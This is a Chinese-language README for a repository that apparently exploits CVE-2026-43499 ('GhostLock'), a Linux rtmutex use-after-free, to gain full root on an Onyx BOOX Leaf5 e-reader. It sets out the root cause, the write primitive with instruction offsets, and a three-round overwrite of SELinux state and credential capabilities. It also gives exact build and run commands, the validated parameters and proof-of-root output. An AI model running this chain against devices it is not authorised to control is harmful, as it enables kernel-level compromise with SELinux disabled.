# Leaf5 GhostLock — ONYX BOOX Leaf5 完整 root

**Onyx BOOX Leaf5**（Android 13 / ONYX 固件 4.2.3 / kernel `4.19.157` #38 / aarch64）上
GhostLock（CVE-2026-43499）的完整利用链：从 UAF 到 `execve` 后不掉能力的 root。

---

## 测试环境

| 项 | 值 | 取自 |
|----|-----|------|
| 品牌 / 型号 | **Onyx BOOX Leaf5** | `ro.product.brand` / `ro.product.model` |
| Android 版本 | **13**（SDK 33） | `ro.build.version.release` / `ro.build.version.sdk` |
| ONYX 固件 | **`4.2.3-rel_0928_656b72278`**（incremental 634） | `ro.build.display.id` / `ro.build.version.onyxincremental` |
| 固件构建时间 | 2026-09-28 15:24:08 HKT | `ro.build.date` |
| 系统指纹 | `ONYX/TabBoox/TabBoox:13/TKQ1.230615.001/GV2.027.SQ83A:user/release-keys` | `ro.build.fingerprint` |
| 内核 | **`4.19.157-perf-g77c132eccfab-dirty` #38 SMP PREEMPT** | `/proc/version` |
| 内核构建时间 | Tue Jul 28 10:48:06 CST 2026（clang 10.0.7 for Android NDK） | `/proc/version` |
| SoC 平台 | `lito` | `ro.board.platform` |
| ABI | `arm64-v8a`（兼容 `armeabi-v7a` / `armeabi`） | `ro.product.cpu.abilist` |
| 分区 | `/system` = `dm-8`（dm-verity，只读）；`/data` 挂载 `nosuid` | `mount` |

```bash
# 核对命令
adb shell getprop ro.product.model ro.build.version.release ro.build.display.id
adb shell cat /proc/version
# 期望：Leaf5 / 13 / 2026-09-28_15-24_4.2.3-rel_0928_656b72278
#       Linux version 4.19.157-perf-g77c132eccfab-dirty ... #38 SMP PREEMPT
```

> `exploit/targets/onyx-leaf5/target.h` 里的每一个偏移都来自 **#38** 这一版内核。
> 同型号但内核号不同的机器，偏移对不上，必须先重做 `target.h`。

---

## 漏洞

本仓库利用的是 **CVE-2026-43499（代号 GhostLock）**，一个 Linux 内核
`rtmutex` 的**栈 use-after-free**，触发面在 `FUTEX_CMP_REQUEUE_PI`。

| 项 | 内容 |
|----|------|
| CVE 编号 | **CVE-2026-43499** |
| 代号 | **GhostLock** |
| 类型 | `rtmutex` 栈 use-after-free（悬垂 `struct rt_mutex_waiter`） |
| 触发接口 | `futex(FUTEX_CMP_REQUEUE_PI)` → `rt_mutex_adjust_prio_chain` 路径 |
| 受影响组件 | `kernel/locking/rtmutex.c`（4.19 系） |
| 内核前置条件 | `CONFIG_FUTEX_PI=y` + `CONFIG_RT_MUTEXES=y`（Leaf5 #38 已确认开启） |
| 利用产出 | 任意写（2×8 字节 / 轮）→ `cred` → `execve` 后不掉能力的 root |

### 根因

```c
/* kernel/locking/rtmutex.c */
static void remove_waiter(struct rt_mutex *lock, struct rt_mutex_waiter *waiter)
{
    rt_mutex_dequeue(lock, waiter);
    current->pi_blocked_on = NULL;      /* ← 用 current 顶替 waiter->task */
}
```

正常路径下 `waiter->task == current`，这行等价。
但 `FUTEX_CMP_REQUEUE_PI` 的异常返回路径会让 `waiter` 变成悬垂结构，
此时 `waiter->task` 指向的不是 `current` —— 清理动作落到了**别人的** `pi_waiters` 树上，
而那棵树里塞着攻击者画好的假 `rb_node`。

### 从 UAF 到任意写

```
悬垂 waiter 被回收后再被引用
        ↓
current->pi_waiters 树里存在我们控制的假 rb_node
        ↓
rt_mutex_dequeue → rb_erase_cached → case1(+0x78)
        ↓
+0x80  str x10,[x8]        *(target) = value        ← 目标写
+0x94  str x8,[x9,#8]      *(value+8) = target      ← 副作用
```

完整推导（为什么必须三轮、为什么必须新线程常驻、为什么掩码是指针低位）
见 [`docs/ROOT_CHAIN.md`](docs/ROOT_CHAIN.md)。

### 代码位置

| 阶段 | 文件 | 说明 |
|------|------|------|
| 触发 UAF | `exploit/src/main.c:1223-1225` | `EDEADLK(35)` = 命中 `pi_blocked_on` 原始边 |
| 回收悬垂栈 | `exploit/src/main.c:807-880` | 16KB 栈 reclaim |
| 写原语 | `exploit/src/fops.c:79-400` | `WRITE_PLAN` 解析、shape 选择 |
| 任意写落地 | `exploit/src/main.c:2088` | 三轮 `THREAD_RACE` |
| 提权收尾 | `exploit/src/main.c:2641-2880` | `CAPS_FULL_FINISH` |

---

## 结论摘要

| 项 | 状态 |
|----|------|
| 前半链（泄漏 / spray / GhostLock / KGSL CFU 触发） | ✅ |
| 写原语（`rb_erase_cached` 约束写，2×8 字节 store） | ✅ |
| 三轮 route 写 `selinux_state` + `cred+0x30` + `cred+0x40` | ✅ |
| `execve` 后 `CapEff` 非 0（真 root，不是进程内半 root） | ✅ B407 |
| `CAP_SYS_ADMIN`（`mount`） | ⚠️ 取决于 KASLR slide，约 1/2 |
| 持久化到 `/system` | ⛔ dm-verity 保护，做不到 |

设备实测：

```bash
$ /data/local/tmp/su -c "id"
uid=0(root) gid=0(root)

$ /data/local/tmp/su -c "grep -E '^Cap(Eff|Bnd)' /proc/self/status"
CapEff: 0000002d049201cf
CapBnd: ffffffa4d2b201cf

$ /data/local/tmp/su -c "mount -t tmpfs tmpfs /data/local/tmp/m && echo MOUNT_OK"
MOUNT_OK                      # bit21=1 时
```

单轮 ~96 秒，成功率约 2/3，三次重试约 96%。

---

## 快速使用

```bash
# 0. 依赖：Android NDK（r27+）、adb、bash
#    本机没装 NDK 时用 Docker：cd exploit && ./docker-build.sh

# 1. 编译 -> out/exploit/aarch64/preload.so
make exploit

# 2. 推到设备 -> /data/local/tmp/exploit/aarch64/
./scripts/deploy.sh

# 3. 跑（最多 3 次，成功即停）
./scripts/root_try.sh 3

# 需要 CAP_SYS_ADMIN（mount 能力）才收工
REQUIRE_SYSADMIN=1 ./scripts/root_try.sh 8
```

`root_try.sh` 成功时会直接打出 `id`、`CapEff`、`TOUCH_OK`、`MOUNT_OK`。
判定成功的三条：`uptime` 没回绕、`exec_probe.txt` 的 `CapEff` ≠ `0xc0`、`su -c id` 是 `uid=0`。

设备端也可以脱离电脑自己跑（`preload.so` 已推上去之后）：

```bash
adb shell "sh /data/local/tmp/device_root.sh wait"
```

---

## 仓库布局

```
.
├── README.md                  ← 本文件（正序：怎么用）
├── docs/
│   ├── ROOT_CHAIN.md          ★ 倒推式技术报告（结果 → 每一层为什么必须这么做）
│   └── PARAMS.md              参数全表（源码默认 / 实证值 / 改了会怎样）
├── scripts/                   主机侧脚本（路径全部参数化，不写死）
│   ├── env.sh                 公共变量 + 已验证 chain 配置
│   ├── deploy.sh              推送产物到设备
│   ├── run_chain.sh           跑一轮 chain（盯 uptime / enforce / 日志 / pstore）
│   ├── root_try.sh            最多 N 次自动重试
│   └── device_root.sh         设备端一键（不依赖电脑）
├── exploit/                   exploit 源码（targets/onyx-leaf5）
│   ├── src/main.c             入口 / GhostLock 编排 / THREAD_RACE / CAPS_FULL_FINISH
│   ├── src/fops.c             ★ 写原语：WRITE_PLAN 解析、shape 选择、pselect paint
│   ├── src/util.c             泄漏、spray、payload 页、perf 采样
│   ├── src/su_daemon.c        su daemon（socket 协议兼容原 su 客户端）
│   ├── src/preload.c          LD_PRELOAD constructor（chain 入口）
│   └── targets/onyx-leaf5/    内核偏移（只对 #38 有效）
├── leaf5/                     分析流水线 S00–S07（文档 ↔ 代码）
├── build-notes/               构建与验证记录
├── logs/                      实测日志（文本入库，二进制不入库）
└── out/                       编译产物（gitignore）
```

### 流水线一览

| 阶段 | 内容 | 结果 |
|------|------|------|
| S00 | 设备画像 | ✅ |
| S01 | 偏移与栈布局 | ✅ |
| S02 | Kernelsnitch | ✅ |
| S03 | Heap spray | ✅ |
| S04 | GhostLock 触发（`EDEADLK=35`） | ✅ |
| S05 | 栈覆盖（多路由并列） | ✅ |
| S06 | E2E 集成 | ✅ |
| S07 | fops / root | ✅（pipe physrw 未做） |

每个节点目录内 `README.md` 记录该处**每个文件**的作用、成功/失败与原因。

---

## 这条链在做什么

一句话：**用 GhostLock 造一个悬垂的 `rt_mutex_waiter`，让 `rb_erase_cached` 的再平衡路径
替我们做两次 8 字节写入。**

```
remove_waiter() 用 current 顶替 waiter->task
        ↓
current->pi_waiters 树里塞进我们画好的假 rb_node
        ↓
rt_mutex_dequeue → rb_erase_cached → case1(+0x78)
        ↓
+0x80  str x10,[x8]        *(target) = value        ← 目标写
+0x94  str x8,[x9,#8]      *(value+8) = target      ← 副作用（会被写坏）
```

一轮只能表达一个 `(target, value)`，所以需要三轮：

| 轮 | 写什么 | 得到什么 |
|----|--------|----------|
| 1 | `*(selinux_state)` = 低零垫片 | `enforcing = 0` |
| 2 | `*(cred+0x30)` = `kbase+0x40a01cf` | `cap_permitted` 整片 |
| 3 | `*(cred+0x40)` = `kbase+0x40a01cf` | `cap_bset` 整片 |

三轮必须落在**同一块 cred** 上（execve 用主线程的 cred），
所以第 2/3 轮换 `CLONE_THREAD` 新线程跑（`copy_creds` 那条分支只 `get_cred`、不复制），
且线程跑完必须 `for(;;) pause()` 常驻（栈上钉着 fake `rt_mutex`）。

**为什么每一步都是唯一解** —— 见 [`docs/ROOT_CHAIN.md`](docs/ROOT_CHAIN.md)。
里面有 5 层倒推、17 条避坑（每条都附崩溃现场）、13 条硬约束。

---

## 参数

全表在 [`docs/PARAMS.md`](docs/PARAMS.md)。已验证的配置打包在 `scripts/env.sh`：

```bash
SKIP_LEAK=1 PERF_CRED=1 PERF_TASK=1 \
WRITE_PLAN=selinux,prmptr,bsetptr THREAD_RACE=1 ROUTE_ROUNDS=3 \
STACK_LOCK=1 PARENT_PAINT=1 CAPS_FULL_FINISH=1 FAST_ROOT=1 INPROC_SU=1 \
PSELECT_ROUTE_ATTEMPTS=2 PAGE_SETUP_ATTEMPTS=1 MM_SPRAY_SLABS=0
```

两个不能动的值：

- `PSELECT_ROUTE_DELAY_USEC=150` —— 这是**时序对齐**，不是等待时长。压小直接 `rtmutex_common.h:60`
- `PSELECT_ROUTE_NFDS=640` —— 必须 > 320，否则 `core_sys_select` 走栈内 `fd_set` 把 waiter memset 掉

---

## 已知限制

| 限制 | 原因 | 影响 |
|------|------|------|
| 重启后要重新跑 | SELinux 回 Enforcing；cred 是新的 | `device_root.sh` 一条命令恢复 |
| `CAP_SYS_ADMIN` 时有时无 | 掩码低位 = `kbase+0x40a01cf`，bit21 由 KASLR slide 决定 | `REQUIRE_SYSADMIN=1` 可筛选 |
| 不能写 `/system` | dm-verity 保护的 dm-linear（`/dev/block/dm-8`） | `blockdev --setrw` 返回 read-only |
| `/data` 不能 setuid | 挂载选项 `nosuid` | `chmod 4755` 无效，只能靠 daemon |
| `modprobe_path` 不可用 | `CONFIG_STATIC_USERMODEHELPER=y` + 静态串为空串 | `call_usermodehelper_exec` 直接 `out_sleep` |
| 只对 `#38` 有效 | 所有偏移来自这一版 | 换内核要重做 `target.h` |

逐条的依据（反汇编地址、pstore 现场）都在 `docs/ROOT_CHAIN.md` §8。

---

## 文档

| 文档 | 用途 |
|------|------|
| [docs/ROOT_CHAIN.md](docs/ROOT_CHAIN.md) | **倒推式技术报告（推荐先读）** |
| [docs/PARAMS.md](docs/PARAMS.md) | 参数全表 |
| [leaf5/stages/README.md](leaf5/stages/README.md) | 分析流水线主索引 |
| [leaf5/PROCESS_LOG.md](leaf5/PROCESS_LOG.md) | 时间线证据 |
| [leaf5/docs/](leaf5/docs/README.md) | 参考文档 / 历史路线 |
| [leaf5/edl/](leaf5/edl/README.md) | EDL 只读提取镜像 |

---

*最后更新: 2026-10-29*
